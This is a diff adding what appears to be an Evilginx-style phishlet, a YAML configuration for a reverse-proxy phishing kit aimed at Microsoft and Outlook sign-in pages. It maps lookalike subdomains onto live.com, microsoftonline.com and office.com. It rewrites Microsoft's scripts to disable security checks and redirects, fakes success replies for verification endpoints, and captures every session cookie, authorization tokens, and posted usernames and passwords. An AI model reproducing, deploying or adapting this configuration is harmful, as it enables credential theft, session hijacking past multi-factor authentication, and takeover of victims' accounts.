@@ -1,0 +1,149 @@
+min_ver: '3.0.0'
+redirect_url: 'https://outlook.office.com/mail/'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'fpt', orig_sub: 'fpt', domain: 'live.com', session: true, auto_filter: true}
+  - {phish_sub: 'fpt1', orig_sub: 'fpt', domain: 'microsoft.com', session: true, auto_filter: true}
+  - {phish_sub: 'logon', orig_sub: 'login', domain: 'microsoft.com', session: true, auto_filter: true}
+  - {phish_sub: 'logon2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, auto_filter: true}
+  - {phish_sub: 'msauth', orig_sub: '*', domain: 'msauth.net', session: true, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, auto_filter: true}
+  - {phish_sub: 'browser', orig_sub: 'browser', domain: 'events.data.microsoft.com', session: true, auto_filter: true}
+
+sub_filters:
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: 'function\\s+(getRedirect|getSecurity|getAuth|getCheck|getVerify)'
+    replace: '// SECURITY DISABLED: function $& {}'
+    mimes: ['application/javascript']
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: '(top|parent|window|location)\\.href\\s*=\\s*["'']?([^"'']*microsoft[^"'']*)["'']?'
+    replace: 'console.log("🚫 REDIRECT BLOCKED:", $2);'
+    mimes: ['application/javascript']
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: '\\/s\\/[a-f0-9]{40,64}'
+    replace: '/blocked-security-check'
+    mimes: ['*/*']
+  # Force redirect to /landingv2 instead of disabling it
+  - triggers_on: 'login.live.com'
+    orig_sub: 'login'
+    domain: 'live.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'login.microsoft.com'
+    orig_sub: 'login'
+    domain: 'microsoft.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'www.office.com'
+    orig_sub: 'www'
+    domain: 'office.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'account.microsoft.com'
+    orig_sub: 'account'
+    domain: 'microsoft.com'
+    search: 'top\.location\.href\s*=\s*data\.redirect_url;?'
+    replace: 'top.location.href = "/landingv2";'
+    mimes: ['application/javascript', 'text/html']
+  - triggers_on: 'login.live.com'
+    orig_sub: 'browser'
+    domain: 'events.data.microsoft.com'
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+
+intercept:
+  - domain: 'login.live.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'live.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'microsoft.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'microsoftonline.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"redirect_url": "/landingv2", "success": true}'
+    mime: 'application/json'
+  - domain: 'office.com'
+    path: '^/s/[a-f0-9]{64}'
+    http_status: 200
+    body: '{"success": true}'
+    mime: 'application/json'
+  - domain: '.*'
+    path: '.*(/s/|check|verify|auth|security).*'
+    http_status: 200
+    body: '{"success": true, "valid": true, "authenticated": true}'
+    mime: 'application/json'
+  - domain: 'browser.events.data.microsoft.com'
+    path: '.*'
+    http_status: 200
+    body: ''
+    mime: 'text/plain'
+
+auth_tokens:
+  - domain: '.live.com'
+    keys: ['.*:regexp']
+    type: 'cookie'
+  - domain: 'live.com'
+    keys: ['.*:regexp']
+    type: 'cookie'
+  - domain: '.microsoft.com'
+    keys: ['.*:regexp']
+    type: 'cookie'
+  - domain: 'microsoft.com'
+    keys: ['.*:regexp']
+    type: 'cookie'
+  - domain: '.microsoftonline.com'
+    keys: ['.*:regexp']
+    type: 'cookie'
+  - domain: 'microsoftonline.com'
+    keys: ['.*:regexp']
+    type: 'cookie'
+  - domain: 'login.live.com'
+    path: '/.*'
+    name: 'token'
+    header: 'authorization'
+    type: 'http'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/landingv2'
+
+login:
+  domain: 'login.live.com'
+  path: '/'
